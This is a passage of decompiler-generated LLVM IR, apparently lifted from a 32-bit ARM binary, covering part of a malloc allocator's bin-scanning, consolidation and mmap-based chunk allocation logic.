  %v2_25c90 = add i32 %v1_25c90, 12
  %v3_25c90 = inttoptr i32 %v2_25c90 to i32*
  store i32 %v0_25c90, i32* %v3_25c90, align 4
  %v0_25c94 = load i32, i32* %lr.global-to-local, align 4
  %v1_25c94 = load i32, i32* %r2.global-to-local, align 4
  %v3_25c94 = add i32 %v1_25c94, %v0_25c94
  %v4_25c94 = inttoptr i32 %v3_25c94 to i32*
  store i32 %v0_25c94, i32* %v4_25c94, align 4
  %v0_25c98 = load i32, i32* %r1.global-to-local, align 4
  %v1_25c98 = load i32, i32* %r2.global-to-local, align 4
  %v2_25c98 = add i32 %v1_25c98, 4
  %v3_25c98 = inttoptr i32 %v2_25c98 to i32*
  store i32 %v0_25c98, i32* %v3_25c98, align 4
  %v0_25c9c = load i32, i32* @r6, align 4
  %v1_25c9c = load i32, i32* %r2.global-to-local, align 4
  %v2_25c9c = add i32 %v1_25c9c, 12
  %v3_25c9c = inttoptr i32 %v2_25c9c to i32*
  store i32 %v0_25c9c, i32* %v3_25c9c, align 4
  %v0_25ca0 = load i32, i32* @r6, align 4
  %v1_25ca0 = load i32, i32* %r2.global-to-local, align 4
  %v2_25ca0 = add i32 %v1_25ca0, 8
  %v3_25ca0 = inttoptr i32 %v2_25ca0 to i32*
  store i32 %v0_25ca0, i32* %v3_25ca0, align 4
  br label %dec_label_pc_26234

dec_label_pc_25cac:                               ; preds = %dec_label_pc_25c14, %dec_label_pc_25c04
  %v1_25c3c = phi i32 [ %storemerge.pre, %dec_label_pc_25c04 ], [ %v3_25c20, %dec_label_pc_25c14 ]
  store i32 %v1_25c3c, i32* %ip.global-to-local, align 4
  %v9_25cac = icmp eq i32 %v1_25c3c, %v1_25c08
  br i1 %v9_25cac, label %dec_label_pc_25cb4.loopexit, label %dec_label_pc_25c14

dec_label_pc_25cb4.loopexit:                      ; preds = %dec_label_pc_25cac
  br label %dec_label_pc_25cb4

dec_label_pc_25cb4:                               ; preds = %dec_label_pc_25bfc.dec_label_pc_25cb4_crit_edge, %dec_label_pc_25cb4.loopexit
  %v4_25ce4.pre-phi = phi i32 [ %.pre200, %dec_label_pc_25bfc.dec_label_pc_25cb4_crit_edge ], [ %v4_25c04, %dec_label_pc_25cb4.loopexit ]
  %v1_25cb4 = add i32 %v0_25cb4.pre, 1
  store i32 %v1_25cb4, i32* %r2.global-to-local, align 4
  %v1_25cb8 = urem i32 %v1_25cb4, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r0.global-to-local, align 4
  %v6_25cc4 = shl i32 1, %v1_25cb8
  store i32 %v6_25cc4, i32* %ip.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_25ccc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25ccc, i32* %r3.global-to-local, align 4
  %v3_25cd0 = udiv i32 %v1_25cb4, 32
  store i32 %v3_25cd0, i32* @r5, align 4
  %v4_25cd4 = mul nuw nsw i32 %v3_25cd0, 4
  %v5_25cd4 = add i32 %v4_25ccc, %v4_25cd4
  store i32 %v5_25cd4, i32* %r2.global-to-local, align 4
  %v1_25cd8 = add i32 %v5_25cd4, 820
  %v2_25cd8 = inttoptr i32 %v1_25cd8 to i32*
  %v3_25cd8 = load i32, i32* %v2_25cd8, align 4
  store i32 %v3_25cd8, i32* @r4, align 4
  %v1_25cdc = add i32 %v4_25ccc, 52
  store i32 %v1_25cdc, i32* %r3.global-to-local, align 4
  store i32 72, i32* @r8, align 4
  %v5_25ce4 = add i32 %v1_25cdc, %v4_25ce4.pre-phi
  store i32 %v5_25ce4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25ce8

dec_label_pc_25ce8:                               ; preds = %dec_label_pc_25d50, %dec_label_pc_25cb4
  %v1_25cf0 = phi i32 [ %v1_25cf0.pre, %dec_label_pc_25d50 ], [ %v3_25cd8, %dec_label_pc_25cb4 ]
  %v0_25cf0 = phi i32 [ %v0_25ce8.pre, %dec_label_pc_25d50 ], [ %v6_25cc4, %dec_label_pc_25cb4 ]
  %v1_25ce8 = sub i32 1, %v0_25cf0
  %v2_25ce8 = icmp ult i32 %v0_25cf0, 2
  %v1_25ce8. = select i1 %v2_25ce8, i32 %v1_25ce8, i32 0
  store i32 %v1_25ce8., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_25cf0, %v1_25cf0
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_25ce8
  %v5_25cf4 = or i32 %v1_25ce8., 1
  store i32 %v5_25cf4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_25d00.preheader

bb142:                                            ; preds = %dec_label_pc_25ce8
  %v2_25cf8 = icmp eq i32 %v1_25ce8., 0
  br i1 %v2_25cf8, label %.dec_label_pc_25d3c.preheader_crit_edge, label %dec_label_pc_25d00.preheader

.dec_label_pc_25d3c.preheader_crit_edge:          ; preds = %bb142
  %v0_25d3454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25d3c.preheader

dec_label_pc_25d00.preheader:                     ; preds = %bb142, %.thread12
  %v0_25d00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_25d00

dec_label_pc_25d00:                               ; preds = %dec_label_pc_25d00.preheader, %dec_label_pc_25d0c
  %v0_25d00 = phi i32 [ %v0_25d00.pre, %dec_label_pc_25d00.preheader ], [ %v1_25d00, %dec_label_pc_25d0c ]
  %v1_25d00 = add i32 %v0_25d00, 1
  store i32 %v1_25d00, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_25d00, 2
  br i1 %tmp208, label %dec_label_pc_25de0.loopexit, label %dec_label_pc_25d0c

dec_label_pc_25d0c:                               ; preds = %dec_label_pc_25d00
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r3.global-to-local, align 4
  %v1_25d10 = load i32, i32* @r8, align 4
  %v2_25d10 = add i32 %v1_25d10, ptrtoint (i32* @global_var_428d0.3044 to i32)
  %v3_25d10 = inttoptr i32 %v2_25d10 to i32*
  %v4_25d10 = load i32, i32* %v3_25d10, align 4
  store i32 %v4_25d10, i32* %r2.global-to-local, align 4
  %v4_25d14 = mul i32 %v1_25d00, 4
  %v5_25d14 = add i32 %v4_25d10, %v4_25d14
  store i32 %v5_25d14, i32* %r3.global-to-local, align 4
  %v1_25d18 = add i32 %v5_25d14, 820
  %v2_25d18 = inttoptr i32 %v1_25d18 to i32*
  %v3_25d18 = load i32, i32* %v2_25d18, align 4
  store i32 %v3_25d18, i32* @r4, align 4
  %v2_25d1c = icmp eq i32 %v3_25d18, 0
  br i1 %v2_25d1c, label %dec_label_pc_25d00, label %dec_label_pc_25d24

dec_label_pc_25d24:                               ; preds = %dec_label_pc_25d0c
  %v4_25d24 = mul i32 %v1_25d00, 256
  %v5_25d24 = add i32 %v4_25d10, %v4_25d24
  store i32 %v5_25d24, i32* %r3.global-to-local, align 4
  %v1_25d28 = add i32 %v5_25d24, 44
  store i32 %v1_25d28, i32* %r0.global-to-local, align 4
  %v0_25d2c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_25d2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_25d3c.preheader

dec_label_pc_25d3c.preheader:                     ; preds = %.dec_label_pc_25d3c.preheader_crit_edge, %dec_label_pc_25d24
  %v0_25d3454 = phi i32 [ %v1_25d28, %dec_label_pc_25d24 ], [ %v0_25d3454.pre, %.dec_label_pc_25d3c.preheader_crit_edge ]
  %v0_25d58 = phi i32 [ %v3_25d18, %dec_label_pc_25d24 ], [ %v1_25cf0, %.dec_label_pc_25d3c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_25d2c, %dec_label_pc_25d24 ], [ %v0_25cf0, %.dec_label_pc_25d3c.preheader_crit_edge ]
  %v2_25d3c51 = and i32 %ip.promoted, %v0_25d58
  %v4_25d3c53 = icmp eq i32 %v2_25d3c51, 0
  br i1 %v4_25d3c53, label %dec_label_pc_25d34, label %dec_label_pc_25d44

dec_label_pc_25d34:                               ; preds = %dec_label_pc_25d3c.preheader, %dec_label_pc_25d34
  %v2_25d3856 = phi i32 [ %v2_25d38, %dec_label_pc_25d34 ], [ %ip.promoted, %dec_label_pc_25d3c.preheader ]
  %v0_25d3455 = phi i32 [ %v1_25d34, %dec_label_pc_25d34 ], [ %v0_25d3454, %dec_label_pc_25d3c.preheader ]
  %v1_25d34 = add i32 %v0_25d3455, 8
  %v2_25d38 = mul i32 %v2_25d3856, 2
  %v2_25d3c = and i32 %v2_25d38, %v0_25d58
  %v4_25d3c = icmp eq i32 %v2_25d3c, 0
  br i1 %v4_25d3c, label %dec_label_pc_25d34, label %dec_label_pc_25d3c.dec_label_pc_25d44_crit_edge

dec_label_pc_25d3c.dec_label_pc_25d44_crit_edge:  ; preds = %dec_label_pc_25d34
  store i32 %v1_25d34, i32* %r0.global-to-local, align 4
  store i32 %v2_25d38, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_25d44

dec_label_pc_25d44:                               ; preds = %dec_label_pc_25d3c.dec_label_pc_25d44_crit_edge, %dec_label_pc_25d3c.preheader
  %v0_25d64 = phi i32 [ %v2_25d38, %dec_label_pc_25d3c.dec_label_pc_25d44_crit_edge ], [ %ip.promoted, %dec_label_pc_25d3c.preheader ]
  %v0_25d88 = phi i32 [ %v1_25d34, %dec_label_pc_25d3c.dec_label_pc_25d44_crit_edge ], [ %v0_25d3454, %dec_label_pc_25d3c.preheader ]
  %v1_25d44 = add i32 %v0_25d88, 12
  %v2_25d44 = inttoptr i32 %v1_25d44 to i32*
  %v3_25d44 = load i32, i32* %v2_25d44, align 4
  store i32 %v3_25d44, i32* @lr, align 4
  %v9_25d48 = icmp eq i32 %v3_25d44, %v0_25d88
  br i1 %v9_25d48, label %dec_label_pc_25d50, label %dec_label_pc_25d70

dec_label_pc_25d50:                               ; preds = %dec_label_pc_25d44
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r0.global-to-local, align 4
  %v1_25d54 = load i32, i32* @r8, align 4
  %v2_25d54 = add i32 %v1_25d54, ptrtoint (i32* @global_var_428d0.3044 to i32)
  %v3_25d54 = inttoptr i32 %v2_25d54 to i32*
  %v4_25d54 = load i32, i32* %v3_25d54, align 4
  %v2_25d58 = sub i32 -1, %v0_25d64
  %v3_25d58 = and i32 %v0_25d58, %v2_25d58
  store i32 %v3_25d58, i32* @r4, align 4
  %v1_25d5c = load i32, i32* @r5, align 4
  %v4_25d5c = mul i32 %v1_25d5c, 4
  %v5_25d5c = add i32 %v4_25d5c, %v4_25d54
  store i32 %v5_25d5c, i32* %r3.global-to-local, align 4
  %v1_25d60 = add i32 %v0_25d88, 8
  store i32 %v1_25d60, i32* %r0.global-to-local, align 4
  %v2_25d64 = mul i32 %v0_25d64, 2
  store i32 %v2_25d64, i32* %ip.global-to-local, align 4
  %v2_25d68 = add i32 %v5_25d5c, 820
  %v3_25d68 = inttoptr i32 %v2_25d68 to i32*
  store i32 %v3_25d58, i32* %v3_25d68, align 4
  %v0_25ce8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_25cf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_25ce8

dec_label_pc_25d70:                               ; preds = %dec_label_pc_25d44
  %v1_25d70 = add i32 %v3_25d44, 4
  %v2_25d70 = inttoptr i32 %v1_25d70 to i32*
  %v3_25d70 = load i32, i32* %v2_25d70, align 4
  store i32 %v3_25d70, i32* %r3.global-to-local, align 4
  %v1_25d74 = and i32 %v3_25d70, -4
  store i32 %v1_25d74, i32* %r2.global-to-local, align 4
  %v0_25d78 = load i32, i32* @sl, align 4
  %v2_25d78 = sub i32 %v1_25d74, %v0_25d78
  store i32 %v2_25d78, i32* %ip.global-to-local, align 4
  %v1_25d7c = add i32 %v3_25d44, 12
  %v2_25d7c = inttoptr i32 %v1_25d7c to i32*
  %v3_25d7c = load i32, i32* %v2_25d7c, align 4
  store i32 %v3_25d7c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_25d78, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_25d70
  %v6_25d84 = add i32 %v1_25d74, %v3_25d44
  store i32 %v6_25d84, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_25d70, %bb143
  %v2_25d88 = add i32 %v3_25d7c, 8
  %v3_25d88 = inttoptr i32 %v2_25d88 to i32*
  store i32 %v0_25d88, i32* %v3_25d88, align 4
  %v0_25d8c = load i32, i32* %r3.global-to-local, align 4
  %v1_25d8c = load i32, i32* %r0.global-to-local, align 4
  %v2_25d8c = add i32 %v1_25d8c, 12
  %v3_25d8c = inttoptr i32 %v2_25d8c to i32*
  store i32 %v0_25d8c, i32* %v3_25d8c, align 4
  %v4_25d90 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_25c6c_crit_edge, label %dec_label_pc_25d9c

.dec_label_pc_25c6c_crit_edge:                    ; preds = %bb144
  %v5_25d90 = add i32 %v4_25d90, 8
  store i32 %v5_25d90, i32* %r4.global-to-local, align 4
  %v4_25d94 = load i32, i32* %r2.global-to-local, align 4
  %v5_25d94 = add i32 %v4_25d94, 4
  %v6_25d94 = inttoptr i32 %v5_25d94 to i32*
  %v7_25d94 = load i32, i32* %v6_25d94, align 4
  store i32 %v7_25d94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_25c6c

dec_label_pc_25d9c:                               ; preds = %bb144
  %v1_25d9c = load i32, i32* @sl, align 4
  %v2_25d9c = add i32 %v1_25d9c, %v4_25d90
  store i32 %v2_25d9c, i32* %r1.global-to-local, align 4
  %v1_25da4 = load i32, i32* @r6, align 4
  %v2_25da4 = add i32 %v1_25da4, 8
  %v3_25da4 = inttoptr i32 %v2_25da4 to i32*
  store i32 %v2_25d9c, i32* %v3_25da4, align 4
  %v0_25da8 = load i32, i32* %r1.global-to-local, align 4
  %v1_25da8 = load i32, i32* @r6, align 4
  %v2_25da8 = add i32 %v1_25da8, 12
  %v3_25da8 = inttoptr i32 %v2_25da8 to i32*
  store i32 %v0_25da8, i32* %v3_25da8, align 4
  %v0_25dac = load i32, i32* @r6, align 4
  %v1_25dac = load i32, i32* %r1.global-to-local, align 4
  %v2_25dac = add i32 %v1_25dac, 8
  %v3_25dac = inttoptr i32 %v2_25dac to i32*
  store i32 %v0_25dac, i32* %v3_25dac, align 4
  %v0_25db0 = load i32, i32* @r6, align 4
  %v1_25db0 = load i32, i32* %r1.global-to-local, align 4
  %v2_25db0 = add i32 %v1_25db0, 12
  %v3_25db0 = inttoptr i32 %v2_25db0 to i32*
  store i32 %v0_25db0, i32* %v3_25db0, align 4
  %tmp210 = icmp ult i32 %v1_25d9c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_25d9c
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v8_25dbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v8_25dbc, i32* %r3.global-to-local, align 4
  %v4_25dc0 = load i32, i32* %r1.global-to-local, align 4
  %v6_25dc0 = add i32 %v8_25dbc, 48
  %v7_25dc0 = inttoptr i32 %v6_25dc0 to i32*
  store i32 %v4_25dc0, i32* %v7_25dc0, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_25d9c, %bb145
  %v0_25dc4 = load i32, i32* @sl, align 4
  %v1_25dc4 = or i32 %v0_25dc4, 1
  store i32 %v1_25dc4, i32* %r2.global-to-local, align 4
  %v0_25dc8 = load i32, i32* %ip.global-to-local, align 4
  %v1_25dc8 = or i32 %v0_25dc8, 1
  store i32 %v1_25dc8, i32* %r3.global-to-local, align 4
  %v0_25dcc = load i32, i32* @lr, align 4
  %v1_25dcc = add i32 %v0_25dcc, 8
  store i32 %v1_25dcc, i32* %r4.global-to-local, align 4
  %v2_25dd0 = add i32 %v0_25dcc, 4
  %v3_25dd0 = inttoptr i32 %v2_25dd0 to i32*
  store i32 %v1_25dc4, i32* %v3_25dd0, align 4
  %v0_25dd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_25dd4 = load i32, i32* %r1.global-to-local, align 4
  %v3_25dd4 = add i32 %v1_25dd4, %v0_25dd4
  %v4_25dd4 = inttoptr i32 %v3_25dd4 to i32*
  store i32 %v0_25dd4, i32* %v4_25dd4, align 4
  %v0_25dd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_25dd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_25dd8 = add i32 %v1_25dd8, 4
  %v3_25dd8 = inttoptr i32 %v2_25dd8 to i32*
  store i32 %v0_25dd8, i32* %v3_25dd8, align 4
  br label %dec_label_pc_26234

dec_label_pc_25de0.loopexit:                      ; preds = %dec_label_pc_25d00
  br label %dec_label_pc_25de0

dec_label_pc_25de0:                               ; preds = %dec_label_pc_25de0.loopexit, %dec_label_pc_259f4, %dec_label_pc_259fc
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  %v4_25de8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25de8, i32* @r0, align 4
  %v1_25dec = add i32 %v4_25de8, 44
  %v2_25dec = inttoptr i32 %v1_25dec to i32*
  %v3_25dec = load i32, i32* %v2_25dec, align 4
  store i32 %v3_25dec, i32* %ip.global-to-local, align 4
  %v1_25df0 = add i32 %v3_25dec, 4
  %v2_25df0 = inttoptr i32 %v1_25df0 to i32*
  %v3_25df0 = load i32, i32* %v2_25df0, align 4
  %v0_25df4 = load i32, i32* @sl, align 4
  %v1_25df4 = add i32 %v0_25df4, 16
  store i32 %v1_25df4, i32* %r1.global-to-local, align 4
  %v1_25df8 = and i32 %v3_25df0, -4
  store i32 %v1_25df8, i32* %r3.global-to-local, align 4
  %v3_25dfc = icmp ult i32 %v1_25df8, %v1_25df4
  br i1 %v3_25dfc, label %dec_label_pc_25e2c, label %dec_label_pc_25e08

dec_label_pc_25e08:                               ; preds = %dec_label_pc_25de0
  %v2_25e08 = sub i32 %v1_25df8, %v0_25df4
  %v2_25e0c = add i32 %v0_25df4, %v3_25dec
  store i32 %v2_25e0c, i32* %r1.global-to-local, align 4
  %v1_25e10 = or i32 %v2_25e08, 1
  store i32 %v1_25e10, i32* %r3.global-to-local, align 4
  %v1_25e14 = or i32 %v0_25df4, 1
  store i32 %v1_25e14, i32* %r2.global-to-local, align 4
  %v1_25e18 = add i32 %v3_25dec, 8
  store i32 %v1_25e18, i32* %r4.global-to-local, align 4
  store i32 %v1_25e14, i32* %v2_25df0, align 4
  %v0_25e20 = load i32, i32* %r1.global-to-local, align 4
  %v1_25e20 = load i32, i32* @r0, align 4
  %v2_25e20 = add i32 %v1_25e20, 44
  %v3_25e20 = inttoptr i32 %v2_25e20 to i32*
  store i32 %v0_25e20, i32* %v3_25e20, align 4
  %v0_25e24 = load i32, i32* %r3.global-to-local, align 4
  %v1_25e24 = load i32, i32* %r1.global-to-local, align 4
  %v2_25e24 = add i32 %v1_25e24, 4
  %v3_25e24 = inttoptr i32 %v2_25e24 to i32*
  store i32 %v0_25e24, i32* %v3_25e24, align 4
  br label %dec_label_pc_26234

dec_label_pc_25e2c:                               ; preds = %dec_label_pc_25de0
  %v1_25e2c = inttoptr i32 %v4_25de8 to i32*
  %v2_25e2c = load i32, i32* %v1_25e2c, align 4
  store i32 %v2_25e2c, i32* %r3.global-to-local, align 4
  %v1_25e30 = and i32 %v2_25e2c, 2
  store i32 %v1_25e30, i32* %ip.global-to-local, align 4
  %v2_25e30 = icmp eq i32 %v1_25e30, 0
  %v1_25e34 = add i32 %v4_25de8, 860
  %v2_25e34 = inttoptr i32 %v1_25e34 to i32*
  %v3_25e34 = load i32, i32* %v2_25e34, align 4
  store i32 %v3_25e34, i32* %r1.global-to-local, align 4
  br i1 %v2_25e30, label %dec_label_pc_25e4c, label %dec_label_pc_25e3c

dec_label_pc_25e3c:                               ; preds = %dec_label_pc_25e2c
  %v0_25e3c = call i32 @__malloc_consolidate()
  %v0_25e40 = load i32, i32* @sl, align 4
  %v1_25e40 = add i32 %v0_25e40, -7
  store i32 %v1_25e40, i32* %r0.global-to-local, align 4
  %v1_25e44 = call i32 @malloc(i32 %v1_25e40)
  store i32 %v1_25e44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26230

dec_label_pc_25e4c:                               ; preds = %dec_label_pc_25e2c
  %v1_25e4c = add i32 %v4_25de8, 844
  %v2_25e4c = inttoptr i32 %v1_25e4c to i32*
  %v3_25e4c = load i32, i32* %v2_25e4c, align 4
  store i32 %v3_25e4c, i32* %r3.global-to-local, align 4
  %v3_25e50 = icmp ult i32 %v0_25df4, %v3_25e4c
  %v1_25e54 = add i32 %v3_25e34, -1
  store i32 %v1_25e54, i32* %sb.global-to-local, align 4
  br i1 %v3_25e50, label %dec_label_pc_25f28, label %dec_label_pc_25e5c

dec_label_pc_25e5c:                               ; preds = %dec_label_pc_25e4c
  %v1_25e5c = add i32 %v4_25de8, 852
  %v2_25e5c = inttoptr i32 %v1_25e5c to i32*
  %v3_25e5c = load i32, i32* %v2_25e5c, align 4
  store i32 %v3_25e5c, i32* %r2.global-to-local, align 4
  %v1_25e60 = add i32 %v4_25de8, 848
  %v2_25e60 = inttoptr i32 %v1_25e60 to i32*
  %v3_25e60 = load i32, i32* %v2_25e60, align 4
  store i32 %v3_25e60, i32* %r3.global-to-local, align 4
  %v6_25e68 = icmp slt i32 %v3_25e60, %v3_25e5c
  br i1 %v6_25e68, label %dec_label_pc_25e6c, label %dec_label_pc_25f28

dec_label_pc_25e6c:                               ; preds = %dec_label_pc_25e5c
  %v1_25e6c = add i32 %v0_25df4, 10
  %v2_25e70 = add i32 %v1_25e6c, %v3_25e34
  store i32 %v2_25e70, i32* %r3.global-to-local, align 4
  %v2_25e74 = sub i32 0, %v3_25e34
  %v3_25e74 = and i32 %v2_25e70, %v2_25e74
  store i32 %v3_25e74, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_25e74, %v0_25df4
  br i1 %tmp211, label %dec_label_pc_25e80, label %dec_label_pc_25f28

dec_label_pc_25e80:                               ; preds = %dec_label_pc_25e6c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_25e74, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_25e98 = call i32 @mmap(i32 0, i32 %v3_25e74, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_25e98, i32* %r0.global-to-local, align 4
  %v7_25e9c = icmp eq i32 %v6_25e98, -1
  br i1 %v7_25e9c, label %dec_label_pc_25e80.dec_label_pc_25f28_crit_edge, label %dec_label_pc_25ea4

dec_label_pc_25e80.dec_label_pc_25f28_crit_edge:  ; preds = %dec_label_pc_25e80
  %v1_25f4c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_25f28

dec_label_pc_25ea4:                               ; preds = %dec_label_pc_25e80
  %v1_25ea4 = urem i32 %v6_25e98, 8
  store i32 %v1_25ea4, i32* %r2.global-to-local, align 4
  %v2_25ea4 = icmp eq i32 %v1_25ea4, 0
  br i1 %v2_25ea4, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_25ea4
  %v2_25ea8 = sub nsw i32 8, %v1_25ea4
  store i32 %v2_25ea8, i32* %r3.global-to-local, align 4
  %v2_25eac = load i32, i32* @r4, align 4
  %v3_25eac = sub i32 %v2_25eac, %v2_25ea8
  %v3_25eb0 = add i32 %v2_25ea8, %v6_25e98
  store i32 %v3_25eb0, i32* %lr.global-to-local, align 4
  %v2_25eb8 = or i32 %v3_25eac, 2
  store i32 %v2_25eb8, i32* %r2.global-to-local, align 4
  %v5_25ec0 = inttoptr i32 %v3_25eb0 to i32*
  store i32 %v2_25ea8, i32* %v5_25ec0, align 4
  %v1_25ec4 = load i32, i32* %r2.global-to-local, align 4
  %v2_25ec4 = load i32, i32* %lr.global-to-local, align 4
  %v3_25ec4 = add i32 %v2_25ec4, 4
  %v4_25ec4 = inttoptr i32 %v3_25ec4 to i32*
  store i32 %v1_25ec4, i32* %v4_25ec4, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_25ea4
  store i32 %v6_25e98, i32* %lr.global-to-local, align 4
  %v1_25ebc47 = load i32, i32* @r4, align 4
  %v2_25ebc48 = or i32 %v1_25ebc47, 2
  store i32 %v2_25ebc48, i32* %r3.global-to-local, align 4
  %v3_25ec8 = inttoptr i32 %v6_25e98 to i32*
  store i32 0, i32* %v3_25ec8, align 4
  %v1_25ecc = load i32, i32* %r3.global-to-local, align 4
  %v2_25ecc = load i32, i32* %lr.global-to-local, align 4
  %v3_25ecc = add i32 %v2_25ecc, 4
  %v4_25ecc = inttoptr i32 %v3_25ecc to i32*
  store i32 %v1_25ecc, i32* %v4_25ecc, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_25ed8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_25ed8, i32* %ip.global-to-local, align 4
  %v1_25edc = add i32 %v4_25ed8, 848
  %v2_25edc = inttoptr i32 %v1_25edc to i32*
  %v3_25edc = load i32, i32* %v2_25edc, align 4
  store i32 %v3_25edc, i32* %r3.global-to-local, align 4
  %v1_25ee0 = add i32 %v4_25ed8, 856
  %v2_25ee0 = inttoptr i32 %v1_25ee0 to i32*
  %v3_25ee0 = load i32, i32* %v2_25ee0, align 4
  store i32 %v3_25ee0, i32* %r2.global-to-local, align 4
  %v1_25ee4 = add i32 %v3_25edc, 1
  store i32 %v1_25ee4, i32* %r3.global-to-local, align 4
  %v7_25eec = icmp sgt i32 %v1_25ee4, %v3_25ee0
  br i1 %v7_25eec, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_25ee4, i32* %v2_25ee0, align 4
  %v0_25ef0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_25ef0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_25ef0 = phi i32 [ %v4_25ed8, %.thread27 ], [ %v1_25ef0.pre, %bb147 ]
  %v0_25ef0 = phi i32 [ %v1_25ee4, %.thread27 ], [ %v0_25ef0.pre, %bb147 ]
  %v2_25ef0 = add i32 %v1_25ef0, 848
  %v3_25ef0 = inttoptr i32 %v2_25ef0 to i32*
  store i32 %v0_25ef0, i32* %v3_25ef0, align 4
  %v0_25ef4 = load i32, i32* %ip.global-to-local, align 4
  %v1_25ef4 = add i32 %v0_25ef4, 868
  %v2_25ef4 = inttoptr i32 %v1_25ef4 to i32*
  %v3_25ef4 = load i32, i32* %v2_25ef4, align 4
  store i32 %v3_25ef4, i32* %r3.global-to-local, align 4
  %v1_25ef8 = add i32 %v0_25ef4, 880
  %v2_25ef8 = inttoptr i32 %v1_25ef8 to i32*
  %v3_25ef8 = load i32, i32* %v2_25ef8, align 4
  store i32 %v3_25ef8, i32* %r2.global-to-local, align 4
  %v0_25efc = load i32, i32* @r4, align 4
  %v2_25efc = add i32 %v0_25efc, %v3_25ef4
  store i32 %v2_25efc, i32* %r1.global-to-local, align 4
  %v1_25f00 = add i32 %v0_25ef4, 872
  %v2_25f00 = inttoptr i32 %v1_25f00 to i32*
  %v3_25f00 = load i32, i32* %v2_25f00, align 4
  store i32 %v3_25f00, i32* %r3.global-to-local, align 4
  %v1_25f08 = add i32 %v0_25ef4, 884
  %v2_25f08 = inttoptr i32 %v1_25f08 to i32*
  %v3_25f08 = load i32, i32* %v2_25f08, align 4
  store i32 %v3_25f08, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_25efc, %v3_25ef8
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_25efc, i32* %v2_25ef8, align 4
  %v0_25f10.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_25f10.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_25f10 = phi i32 [ %v0_25ef4, %bb148 ], [ %v1_25f10.pre, %bb149 ]
  %v0_25f10 = phi i32 [ %v2_25efc, %bb148 ], [ %v0_25f10.pre, %bb149 ]
  %v2_25f10 = add i32 %v1_25f10, 868
  %v3_25f10 = inttoptr i32 %v2_25f10 to i32*
  store i32 %v0_25f10, i32* %v3_25f10, align 4
  %v0_25f14 = load i32, i32* %r1.global-to-local, align 4
  %v1_25f14 = load i32, i32* %r3.global-to-local, align 4
  %v2_25f14 = add i32 %v1_25f14, %v0_25f14
  store i32 %v2_25f14, i32* %r1.global-to-local, align 4
  %v1_25f18 = load i32, i32* %r2.global-to-local, align 4
  %v0_25f1c = load i32, i32* %lr.global-to-local, align 4
  %v1_25f1c = add i32 %v0_25f1c, 8
  store i32 %v1_25f1c, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_25f14, %v1_25f18
  br i1 %tmp213, label %bb151, label %dec_label_pc_26230

bb151:                                            ; preds = %bb150
  %v5_25f20 = load i32, i32* %ip.global-to-local, align 4
